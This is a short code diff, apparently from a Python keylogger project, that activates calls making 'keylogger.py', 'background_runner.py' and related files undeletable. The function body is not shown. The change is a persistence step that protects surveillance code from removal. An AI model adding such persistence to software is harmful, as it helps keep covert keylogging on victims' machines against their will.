@@ -13,10 +13,10 @@ def make_file_undeletable(filepath):
 
 if __name__ == "__main__":
     make_file_undeletable("logs.txt")
-    # make_file_undeletable("background_runner.py")
-    # make_file_undeletable("keylogger.py")
-    # make_file_undeletable("test.py")
-    # make_file_undeletable("test1.py")
+    make_file_undeletable("background_runner.py")
+    make_file_undeletable("keylogger.py")
+    make_file_undeletable("test.py")
+    make_file_undeletable("test1.py")
     
     
     
